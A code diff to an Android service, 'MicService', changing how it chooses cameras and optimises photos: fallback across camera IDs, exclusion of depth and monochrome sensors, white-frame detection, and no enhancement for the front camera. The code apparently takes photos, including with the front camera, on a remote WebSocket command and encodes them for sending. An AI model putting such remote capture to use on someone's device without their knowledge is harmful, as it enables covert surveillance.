@@ -1060,7 +1060,7 @@ class MicService : Service() {
                     webSocket?.send("ACK:take_photo:failed")
                     return@launch
                 }
-                val optimized = optimizePhotoJpeg(jpeg)
+                val optimized = optimizePhotoJpeg(jpeg, facing)
                 val base64 = Base64.encodeToString(optimized, Base64.NO_WRAP)
                 val cameraName = if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
                 val filename = "photo_${deviceId.take(8)}_${cameraName}_${System.currentTimeMillis()}.jpg"
@@ -1089,7 +1089,26 @@ class MicService : Service() {
     @SuppressLint("MissingPermission")
     private fun captureJpegOnce(targetFacing: Int): ByteArray? {
         val cm = getSystemService(CameraManager::class.java) ?: return null
-        val cameraId = selectCameraId(cm, targetFacing) ?: return null
+        val cameraIds = selectCameraIds(cm, targetFacing).take(3)
+        if (cameraIds.isEmpty()) return null
+        Log.i(TAG, "Photo capture candidates facing=$targetFacing ids=${cameraIds.joinToString(",")}")
+
+        var lastFrame: ByteArray? = null
+        for ((index, cameraId) in cameraIds.withIndex()) {
+            val jpeg = captureJpegFromCameraId(cm, cameraId) ?: continue
+            lastFrame = jpeg
+            val looksWhite = isLikelyWhiteJpeg(jpeg)
+            if (!looksWhite) return jpeg
+            if (index < cameraIds.lastIndex) {
+                Log.w(TAG, "White-looking frame from cameraId=$cameraId, trying fallback")
+            }
+        }
+        Log.w(TAG, "All capture candidates looked white/invalid; returning last frame")
+        return lastFrame
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun captureJpegFromCameraId(cm: CameraManager, cameraId: String): ByteArray? {
         val chars = cm.getCameraCharacteristics(cameraId)
         val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
         val maxEdge = when (photoQualityMode) {
@@ -1191,24 +1210,80 @@ class MicService : Service() {
         }
     }
 
-    private fun selectCameraId(cm: CameraManager, targetFacing: Int): String? {
-        val ids = cm.cameraIdList ?: return null
-        var fallback: String? = null
+    private fun selectCameraIds(cm: CameraManager, targetFacing: Int): List<String> {
+        val ids = cm.cameraIdList
+        val target = mutableListOf<Pair<String, Long>>()
+        val fallback = mutableListOf<Pair<String, Long>>()
         for (id in ids) {
             val c = cm.getCameraCharacteristics(id)
             val facing = c.get(CameraCharacteristics.LENS_FACING)
             val caps = c.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
-            val streamMap = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
-            val hasJpeg = streamMap?.getOutputSizes(ImageFormat.JPEG)?.isNotEmpty() == true
+            val isDepth = caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_DEPTH_OUTPUT)
+            val isMonochrome = caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_MONOCHROME)
+            if (isDepth || isMonochrome) continue
+            val streamMap = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: continue
+            val jpegSizes = streamMap.getOutputSizes(ImageFormat.JPEG) ?: continue
+            if (jpegSizes.isEmpty()) continue
             val isBackwardCompatible = caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_BACKWARD_COMPATIBLE)
-            if (!hasJpeg || !isBackwardCompatible) {
-                continue
+            if (!isBackwardCompatible) continue
+
+            // Prefer a stable "main" stream: logical camera first, then higher max JPEG area.
+            val isLogical = isLogicalMultiCamera(c)
+            val maxJpegArea = jpegSizes.maxOfOrNull { it.width.toLong() * it.height.toLong() } ?: 0L
+            val score = (if (isLogical) 1_000_000_000_000L else 0L) + maxJpegArea
+
+            if (facing == targetFacing) {
+                target += id to score
+            } else {
+                fallback += id to score
             }
-            if (facing == targetFacing && !isLogicalMultiCamera(c)) return id
-            if (facing == targetFacing && fallback == null) fallback = id
-            if (fallback == null) fallback = id
         }
-        return fallback
+        val orderedTarget = target.sortedByDescending { it.second }.map { it.first }
+        val orderedFallback = fallback.sortedByDescending { it.second }.map { it.first }
+        return (orderedTarget + orderedFallback).distinct()
+    }
+
+    private fun isLikelyWhiteJpeg(jpeg: ByteArray): Boolean {
+        return try {
+            val opts = BitmapFactory.Options().apply { inSampleSize = 16 }
+            val bmp = BitmapFactory.decodeByteArray(jpeg, 0, jpeg.size, opts) ?: return false
+            val w = bmp.width
+            val h = bmp.height
+            if (w <= 0 || h <= 0) {
+                bmp.recycle()
+                return false
+            }
+            val stepX = (w / 24).coerceAtLeast(1)
+            val stepY = (h / 24).coerceAtLeast(1)
+            var count = 0
+            var sum = 0.0
+            var minL = 255.0
+            var maxL = 0.0
+
+            var y = 0
+            while (y < h) {
+                var x = 0
+                while (x < w) {
+                    val c = bmp.getPixel(x, y)
+                    val r = (c shr 16) and 0xFF
+                    val g = (c shr 8) and 0xFF
+                    val b = c and 0xFF
+                    val l = (0.2126 * r + 0.7152 * g + 0.0722 * b)
+                    sum += l
+                    if (l < minL) minL = l
+                    if (l > maxL) maxL = l
+                    count++
+                    x += stepX
+                }
+                y += stepY
+            }
+            bmp.recycle()
+            if (count == 0) return false
+            val avg = sum / count
+            avg >= 245.0 && (maxL - minL) <= 8.0
+        } catch (_: Exception) {
+            false
+        }
     }
 
     private fun isLogicalMultiCamera(chars: CameraCharacteristics): Boolean {
@@ -1282,7 +1357,7 @@ class MicService : Service() {
         }
     }
 
-    private fun optimizePhotoJpeg(source: ByteArray): ByteArray {
+    private fun optimizePhotoJpeg(source: ByteArray, cameraFacing: Int): ByteArray {
         return try {
             val qualityMode = photoQualityMode
             val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
@@ -1298,7 +1373,8 @@ class MicService : Service() {
             }
             val opts = BitmapFactory.Options().apply { inSampleSize = sample.coerceAtLeast(1) }
             val bitmap = BitmapFactory.decodeByteArray(source, 0, source.size, opts) ?: return source
-            val enhanced = if (aiPhotoEnhancementEnabled) {
+            val shouldEnhance = aiPhotoEnhancementEnabled && cameraFacing != CameraCharacteristics.LENS_FACING_FRONT
+            val enhanced = if (shouldEnhance) {
                 val avg = estimateLuma(bitmap)
                 val contrast = when {
                     avg < 85f -> 1.18f
@@ -1317,14 +1393,19 @@ class MicService : Service() {
             }
             val out = java.io.ByteArrayOutputStream()
             val jpegQuality = when (qualityMode) {
-                "fast" -> if (aiPhotoEnhancementEnabled) 78 else 72
-                "hd" -> if (aiPhotoEnhancementEnabled) 90 else 86
-                else -> if (aiPhotoEnhancementEnabled) 84 else 78
+                "fast" -> if (shouldEnhance) 78 else 72
+                "hd" -> if (shouldEnhance) 90 else 86
+                else -> if (shouldEnhance) 84 else 78
             }
             enhanced.compress(android.graphics.Bitmap.CompressFormat.JPEG, jpegQuality, out)
             if (enhanced !== bitmap) enhanced.recycle()
             bitmap.recycle()
-            out.toByteArray()
+            val optimized = out.toByteArray()
+            if (cameraFacing == CameraCharacteristics.LENS_FACING_FRONT && isLikelyWhiteJpeg(optimized)) {
+                source
+            } else {
+                optimized
+            }
         } catch (_: Exception) {
             source
         }
